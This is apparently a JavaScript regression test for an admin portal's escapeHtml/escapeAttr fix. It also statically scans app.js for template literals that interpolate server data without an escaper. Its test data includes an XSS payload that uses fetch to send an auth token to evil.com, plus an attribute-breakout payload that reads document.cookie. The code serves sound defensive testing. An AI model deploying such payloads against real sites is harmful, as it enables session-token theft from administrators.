// Standalone test for the escapeHtml()/escapeAttr() fix in ops-admin-portal/app.js.
// Run with: node test-escaping.mjs
// One-time setup (only needed if jsdom isn't already installed somewhere on this machine):
//   npm install jsdom --no-save
//
// This does NOT touch your server or database — it loads the real functions out
// of app.js and checks their output directly, the same way a unit test would in
// a project that had a test framework wired up (this one doesn't yet).

import { JSDOM } from "jsdom";
import { readFileSync } from "fs";

const dom = new JSDOM("<!doctype html><html><body></body></html>");
global.document = dom.window.document;

// Pull the two functions out of the real app.js source rather than
// hand-copying them, so this test breaks if someone edits app.js and
// accidentally reintroduces the bug or changes the escaping behavior.
const source = readFileSync("./ops-admin-portal/app.js", "utf8");
const escapeHtmlMatch = source.match(/function escapeHtml\([\s\S]*?\r?\n}/);
const escapeAttrMatch = source.match(/function escapeAttr\([\s\S]*?\r?\n}/);
const fnSource = escapeHtmlMatch && escapeAttrMatch
  ? [escapeHtmlMatch[0], escapeAttrMatch[0]]
  : null;
if (!fnSource) {
  console.error("Could not find escapeHtml/escapeAttr in app.js — did the function names change?");
  process.exit(1);
}
const defineFns = new Function(
  "root",
  `${fnSource.join("\n\n")}\nroot.escapeHtml = escapeHtml; root.escapeAttr = escapeAttr;`
);
defineFns(globalThis);

let failures = 0;
function check(name, actual, expected) {
  const pass = actual === expected;
  console.log(`${pass ? "PASS" : "FAIL"} — ${name}`);
  if (!pass) {
    console.log(`  expected: ${JSON.stringify(expected)}`);
    console.log(`  actual:   ${JSON.stringify(actual)}`);
    failures++;
  }
}

// The actual payload style that would have executed before the fix.
const scriptPayload = `<img src=x onerror="fetch('https://evil.com/steal?t='+localStorage.authToken)">`;
check(
  "escapeHtml neutralizes a script-bearing label",
  escapeHtml(scriptPayload),
  "&lt;img src=x onerror=\"fetch('https://evil.com/steal?t='+localStorage.authToken)\"&gt;"
);

// A plain, harmless label should render unchanged.
check(
  "escapeHtml leaves an ordinary label alone",
  escapeHtml("Passport – Front Page"),
  "Passport – Front Page"
);

// Attribute-context payload: a filename containing a quote that would
// otherwise break out of data-doc-name="...".
const attrPayload = `resume.pdf" onmouseover="alert(document.cookie)`;
const escapedAttr = escapeAttr(attrPayload);
check(
  "escapeAttr removes the unescaped double-quote that breaks out of an attribute",
  escapedAttr.includes('"'),
  false
);
check(
  "escapeAttr still preserves the readable filename text",
  escapedAttr.includes("resume.pdf"),
  true
);

// Confirm rebuilding it into the actual attribute template used in app.js
// can no longer produce a second real attribute.
const rebuilt = `<button data-doc-name="${escapedAttr}">Download</button>`;
check(
  "rebuilt attribute HTML contains no unescaped quote",
  (rebuilt.match(/"/g) || []).length,
  2 // only the two quotes that legitimately open/close data-doc-name
);

// ---------------------------------------------------------------------------
// Regression guard for the CALL SITES, not just the helpers.
//
// Everything above proves escapeHtml/escapeAttr behave correctly. They always
// did — and the portal still shipped three unescaped render sites anyway (the
// Users table, the Intents table, and the KYC queue), because nothing checked
// that the render functions actually CALL them. That gap produced a real
// stored-XSS on 28 July 2026, reachable by anyone via public signup: a crafted
// first name executed in an admin's session the moment they opened Users or
// KYC Review, where the admin bearer token sits in localStorage.
//
// Testing the helper and not the usage is what let that survive an earlier
// fix. So this section reads the real source and fails if any template literal
// that builds HTML interpolates server data without running it through an
// escaper. It is deliberately source-level: it cannot be satisfied by a
// passing unit test on a function nobody calls.

const htmlSource = readFileSync("./ops-admin-portal/app.js", "utf8");

// Identifiers whose values originate server-side and can therefore carry
// whatever an attacker typed into a signup form.
const TAINTED_ROOT = /^(user|intent|doc|row|req|r|h|u)\b/;

// Wrappers that make an interpolation safe: real escapers, plus formatters
// that can only ever emit digits/dates, plus the internal enum-to-CSS-class
// helpers which never see user input.
const SAFE_WRAPPER =
  /\b(escapeHtml|escapeAttr|formatDate|formatDateOnly|formatMoney|formatCurrency|statusClass|tierClass|Number|encodeURIComponent)\s*\(/;

// Pull out every template literal in the file.
const templates = htmlSource.match(/`(?:[^`\\]|\\[\s\S])*`/g) || [];

// Only care about the ones that actually build markup.
const htmlTemplates = templates.filter((t) => /<\s*[a-zA-Z]/.test(t));

function extractInterpolations(tpl) {
  const out = [];
  for (let i = 0; i < tpl.length - 1; i++) {
    if (tpl[i] === "$" && tpl[i + 1] === "{") {
      let depth = 1;
      let j = i + 2;
      while (j < tpl.length && depth > 0) {
        if (tpl[j] === "{") depth++;
        else if (tpl[j] === "}") depth--;
        if (depth > 0) j++;
      }
      out.push(tpl.slice(i + 2, j));
      i = j;
    }
  }
  return out;
}

const unescaped = [];
for (const tpl of htmlTemplates) {
  for (const expr of extractInterpolations(tpl)) {
    const trimmed = expr.trim();
    if (!TAINTED_ROOT.test(trimmed)) continue;   // not server data
    if (SAFE_WRAPPER.test(trimmed)) continue;    // already wrapped
    unescaped.push(trimmed);
  }
}

check(
  "no HTML template interpolates unescaped server data",
  unescaped.length === 0 ? "none" : unescaped.join(" | "),
  "none"
);

// Sanity-check that the guard above can actually fail — otherwise a broken
// detector would silently "pass" forever, which is the same class of mistake
// as testing a helper nobody calls.
const decoyUnescaped = extractInterpolations("`<td>${user.name}</td>`").filter(
  (e) => TAINTED_ROOT.test(e.trim()) && !SAFE_WRAPPER.test(e.trim())
);
check("guard detects a known-bad interpolation (self-test)", decoyUnescaped.length, 1);

const decoySafe = extractInterpolations("`<td>${escapeHtml(user.name)}</td>`").filter(
  (e) => TAINTED_ROOT.test(e.trim()) && !SAFE_WRAPPER.test(e.trim())
);
check("guard accepts a correctly escaped interpolation (self-test)", decoySafe.length, 0);

console.log(failures === 0 ? "\nAll checks passed." : `\n${failures} check(s) FAILED.`);
process.exit(failures === 0 ? 0 : 1);
